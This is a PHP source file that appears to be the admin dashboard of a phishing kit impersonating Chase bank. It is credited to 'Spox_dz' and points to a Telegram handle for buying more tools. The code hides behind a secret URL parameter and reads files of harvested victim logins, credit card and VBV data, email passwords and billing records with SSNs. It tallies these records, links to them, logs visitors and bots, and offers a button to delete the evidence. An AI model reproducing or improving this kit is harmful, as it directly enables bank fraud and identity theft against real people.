<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
header("Refresh:10;");

#################### *-* Start Include *-* ####################
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

if (!isset($_SESSION['UserData'])) {

    if (isset($_GET['id'])) {
     $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
      if ($id !== 'spox') {
        exit(header("HTTP/1.0 404 Not Found"));
      }
    }else{
        exit(header("HTTP/1.0 404 Not Found"));
    }

}



if(!isset($_SESSION['UserData']['Username'])){header("location:login.php");exit;}else{ include 'YOUR-CONFIG.php';}
$what = $_GET['dila'];

?>

<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CHASE SPOX Login</title>

    <!-- Styling -->
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600|Raleway:400,700" rel="stylesheet">
<link href="files/admin/css/all.min248f.css?v=b4c444" rel="stylesheet">
<link href="files/admin/css/fontawesome-all.min.css" rel="stylesheet">
<link href="files/admin/css/custom.css" rel="stylesheet">
<link rel="shortcut icon" href="files/admin/favicon.png">
<script src="https://kit.fontawesome.com/b7fa9575a5.js"></script>


</head>
<body data-phone-cc-input="1">



<section id="main-menu">

    <nav id="nav" class="navbar navbar-default navbar-main" role="navigation">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#primary-nav">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="primary-nav">

                <ul class="nav navbar-nav">

<li menuitemname="Home" class="" id="Primary_Navbar-Home">
<a href="index.php">Home</a>
</li>
<li menuitemname="Services" class="dropdown" id="Primary_Navbar-Services">

<li menuitemname="Open Ticket" class="" id="Primary_Navbar-Open_Ticket">
<a href="setting.php">Config</a>
</li>
<li menuitemname="Affiliates" class="" id="Primary_Navbar-Affiliates">
<a href="info.php">info</a>
</li>
</ul>

<ul class="nav navbar-nav navbar-right">
<li menuitemname="Account" class="dropdown account" id="Secondary_Navbar-Account">
<a >Hello,<?php echo $yourname; ?> !&nbsp;</a>
</ul>
</li>
</ul>
</div><!-- /.navbar-collapse -->
</div>
</nav>
</section>



<section id="main-body">
<div class="container">
<div class="row">
<div class="col-md-9 pull-md-right">
<div class="header-lined">
<h1>Welcome Back, <?php echo $yourname; ?></h1>

</div>
</div>
<div class="col-md-3 pull-md-left sidebar">
<div menuitemname="Client Details" class="panel panel-sidebar panel-sidebar">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fas fa-user"></i>&nbsp;Your Info
<i class="fas fa-chevron-up panel-minimise pull-right"></i>
</h3>
</div>
<div class="panel-body">
<strong>Hi.</strong><br><br>

<strong>Name: <a style="color:#f0ad4e">[ <?php echo $yourname; ?> ]</a></strong><br>
<strong>Page : <a style="color:#F08080">Chase Spox</a></strong><br>
<strong>Version : <a style="color:green;">V3</a></strong><br>
<strong>Date : <a style="color:#87CEFA;"><?php echo date("Y/m/d"); ?><a></strong><br><br><br>

<div>
<a href="index.php?dila=dellet"  class="btn btn-default bg-color-red btn-xs">
<i class="fas fa-arrow-right" aria-hidden="true"></i>Dellet Data
</a>
</div>
<style>

</style>

</div>
<div class="panel-footer clearfix">
<a href="setting.php" class="btn btn-success btn-sm btn-block">
<i class="fas fa-pencil-alt"></i> Update
</a>
</div>
</div>
</div>
<!-- Container for main page display content -->
<div class="col-md-9 pull-md-right main-content">
            
<?php

$click = "../Spox/Chase_Result/login".$pin.".txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "UserName");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../Spox/Chase_Result/total_login_view.txt";
$file = fopen($click, "r");
$total_login_view = fread($file, filesize($click));
$total_login_view = substr_count($total_login_view, "#>");
fclose($file);
if($total_login_view == 0) {
    $total_login_view = "$total_login_view";
}else{
    $total_login_view = "$total_login_view";
}

$click = "../Spox/Chase_Result/cc".$pin.".txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "Security");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../Spox/Chase_Result/total_cc_view.txt";
$file = fopen($click, "r");
$total_cc_view = fread($file, filesize($click));
$total_cc_view = substr_count($total_cc_view, "#>");
fclose($file);
if($total_cc_view == 0) {
    $total_cc_view = "$total_cc_view";
}else{
    $total_cc_view = "$total_cc_view";
}


$click = "../Spox/Chase_Result/access".$pin.".txt"; 
$file = fopen($click, "r");
$total_email_access = fread($file, filesize($click));
$total_email_access = substr_count($total_email_access, "Password");
fclose($file);
if($total_email_access == 0) {
    $total_email_access = "$total_email_access";
}else{
    $total_email_access = "$total_email_access";
}

$click = "../Spox/Chase_Result/total_email_access_view.txt";
$file = fopen($click, "r");
$total_email_access_view = fread($file, filesize($click));
$total_email_access_view = substr_count($total_email_access_view, "#>");
fclose($file);
if($total_email_access_view == 0) {
    $total_email_access_view = "$total_email_access_view";
}else{
    $total_email_access_view = "$total_email_access_view";
}


$click = "../Spox/Chase_Result/billing".$pin.".txt";
$file = fopen($click, "r");
$total_billing = fread($file, filesize($click));
$total_billing = substr_count($total_billing, "SSN");
fclose($file);
if($total_billing == 0) {
    $total_billing = "$total_billing";
}else{
    $total_billing = "$total_billing";
}

$click = "../Spox/Chase_Result/total_billing_view.txt";
$file = fopen($click, "r");
$total_billing_view = fread($file, filesize($click));
$total_billing_view = substr_count($total_billing_view, "#>");
fclose($file);
if($total_billing_view == 0) {
    $total_billing_view = "$total_billing_view";
}else{
    $total_billing_view = "$total_billing_view";
}



$click = "../visit_log.txt";
$file = fopen($click, "r");
$total_view = fread($file, filesize($click));
$total_view = substr_count($total_view, "#>");
fclose($file);
if($total_view == 0) {
    $total_view = "$total_view";
}else{
    $total_view = "$total_view";
}

$click = "../bots.txt";
$file = fopen($click, "r");
$total_bots = fread($file, filesize($click));
$total_bots = substr_count($total_bots, "#>");
fclose($file);
if($total_bots == 0) {
    $total_bots = "$total_bots";
}else{
    $total_bots = "$total_bots";
}

if($what == "dellet") {
    unlink("../bots.txt");
    unlink("../Spox/Chase_Result/cc".$pin.".txt");
    unlink("../Spox/Chase_Result/access".$pin.".txt");
    unlink("../Spox/Chase_Result/login".$pin.".txt");
    unlink("../visit_log.txt"); 
    unlink("../Spox/Chase_Result/billing".$pin.".txt");

    unlink("../Spox/Chase_Result/total_email_access_view.txt");
    unlink("../Spox/Chase_Result/total_cc_view.txt");
    unlink("../Spox/Chase_Result/total_billing_view.txt");
    unlink("../Spox/Chase_Result/total_login_view.txt");

    echo "<div style='color:#0c0'>You have deleted data successfully</div><br>";
    header("Refresh:0; url=index.php");

}
?>

<div class="tiles clearfix">
    <div class="row">
        <div class="col-sm-3 col-xs-6 tile"  onclick="window.open('../Spox/Chase_Result/login<?=$pin;?>.txt')">
            <a href="../Spox/Chase_Result/login<?=$pin;?>.txt" target="_blanc">
                <div class="icon"><i class="far fa-file-alt"></i></div>
                <div class="stat"><?php echo $total_login; ?></div>
                <div class="title">Login</div>
                <div class="highlight bg-color-blue"></div>
            </a>
        </div>
            <div class="col-sm-3 col-xs-6 tile" onclick="window.open('../Spox/Chase_Result/cc<?=$pin;?>.txt')">
                <a href="../Spox/Chase_Result/cc<?=$pin;?>.txt" target="_blanc">
                    <div class="icon"><i class="fas fa-credit-card"></i></div>
                    <div class="stat"><?php echo $total_cc; ?></div>
                    <div class="title">CC / VBV</div> 
                    <div class="highlight bg-color-green"></div>
                </a>
            </div>
          <div class="col-sm-3 col-xs-6 tile" onclick="window.open('../Spox/Chase_Result/access<?=$pin;?>.txt')">
            <a href="../Spox/Chase_Result/access<?=$pin;?>.txt" target="_blanc">
                <div class="icon"><i class="fas fa-envelope"></i></div>
                <div class="stat"><?php echo $total_email_access; ?></div>
                <div class="title">Email Access</div>
                <div class="highlight bg-color-red"></div>
            </a>
        </div>
        <div class="col-sm-3 col-xs-6 tile" onclick="window.open('../Spox/Chase_Result/billing<?=$pin;?>.txt')">
            <a href="../Spox/Chase_Result/billing<?=$pin;?>.txt" target="_blanc">
                <div class="icon"><i class="far fa-file-alt" aria-hidden="true"></i></div>
                <div class="stat"><?php echo $total_billing; ?></div>
                <div class="title">Billing</div>
                <div class="highlight bg-color-gold"></div>
            </a>
        </div>
    </div>
</div>

<div class="tiles clearfix">
    <div class="row">
        <div class="col-sm-3 col-xs-6 tile"  onclick="window.open('../Spox/Chase_Result/total_login_view.txt')">
            <a href="../Spox/Chase_Result/total_login_view.txt" target="_blanc">
                <div class="icon"><i class="far fa-file-alt"></i></div>
                <div class="stat"><?php echo $total_login_view; ?></div>
                <div class="title">LOGIN PAGE VIEW</div>
                <div class="highlight bg-color-blue"></div>
            </a>
        </div>
            <div class="col-sm-3 col-xs-6 tile" onclick="window.open('../Spox/Chase_Result/total_cc_view.txt')">
                <a href="../Spox/Chase_Result/total_cc_view.txt" target="_blanc">
                    <div class="icon"><i class="fas fa-credit-card"></i></div>
                    <div class="stat"><?php echo $total_cc_view; ?></div>
                    <div class="title">CC PAGE VIEW</div> 
                    <div class="highlight bg-color-green"></div>
                </a>
            </div>
          <div class="col-sm-3 col-xs-6 tile" onclick="window.open('../Spox/Chase_Result/total_email_access_view.txt')">
            <a href="../Spox/Chase_Result/total_email_access_view.txt" target="_blanc">
                <div class="icon"><i class="fas fa-envelope"></i></div>
                <div class="stat"><?php echo $total_email_access_view; ?></div>
                <div class="title">ACCESS EMAIL VIEW</div>
                <div class="highlight bg-color-red"></div>
            </a>
        </div>
        <div class="col-sm-3 col-xs-6 tile" onclick="window.open('../Spox/Chase_Result/total_billing_view.txt')">
            <a href="../Spox/Chase_Result/total_billing_view.txt" target="_blanc">
                <div class="icon"><i class="far fa-file-alt" aria-hidden="true"></i></div>
                <div class="stat"><?php echo $total_billing_view; ?></div>
                <div class="title">BILLING VIEW</div>
                <div class="highlight bg-color-gold"></div>
            </a>
        </div>
    </div>
</div>

<div class="client-home-panels">
    <div class="row">
        <div class="col-sm-6">

            

                                                
<div menuitemname="Overdue Invoices" class="panel panel-default panel-accent-red">
<div class="panel-heading">
<h3 class="panel-title">
<div class="pull-right">
<a href="../visit_log.txt" target="_blanc" class="btn btn-default bg-color-red btn-xs">
<i class="fas fa-arrow-right"></i>View All
</a>
</div>
<i class="fas fa-calculator"></i>&nbsp;Views <a style="color: #d9534f;
    /* width: 106px; */
    font-size: 20px;"><?php echo $total_view; ?></a>
</h3>
</div>
<div class="panel-body">
<p>
<?php
echo file_get_contents("../visit_log.txt");
?>
</p>
</div>
<div class="panel-footer">
</div>
</div>
            

            
                                                        
</div>
<div class="col-sm-6">

                                                                            
<div menuitemname="Active Products/Services" class="panel panel-default panel-accent-gold">
<div class="panel-heading">
<h3 class="panel-title">
<div class="pull-right">
<a href="../bots.txt" target="_blanc" class="btn btn-default bg-color-gold btn-xs">
<i class="fas fa-plus"></i>View All
</a>
</div>
<i class="fas fa-cube"></i>&nbsp;Bots  <a style="color: #d9534f;
    /* width: 106px; */
    font-size: 20px;"><?php echo $total_bots; ?></a>
</h3>
</div>
<div class="panel-body">
<p>
<?php
echo file_get_contents("../bots.txt");
?>
</p>
</div>
<div class="panel-footer">
</div>
</div>   
     

</div>
</div>
</div>
</div><!-- /.main-content -->
<div class="col-md-3 pull-md-left sidebar sidebar-secondary">

<div menuitemname="Client Shortcuts" class="panel panel-sidebar panel-sidebar">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fas fa-bookmark"></i>&nbsp;Shortcuts
<i class="fas fa-chevron-up panel-minimise pull-right"></i>
</h3>
</div>
<div class="list-group">
<a menuitemname="Order New Services" href="https://t.me/spoxcoder" target="_blanc" class="list-group-item" id="Secondary_Sidebar-Client_Shortcuts-Order_New_Services">
<i class="fas fa-shopping-cart fa-fw"></i>&nbsp;Order New Tools
</a>
<a menuitemname="Logout" href="logout.php" class="list-group-item" id="Secondary_Sidebar-Client_Shortcuts-Logout">
<i class="fas fa-arrow-left fa-fw"></i>&nbsp;Logout
</a>
</div>
</div>
</div>
<div class="clearfix"></div>
</div>
</div>
</section>



</body>
</html>
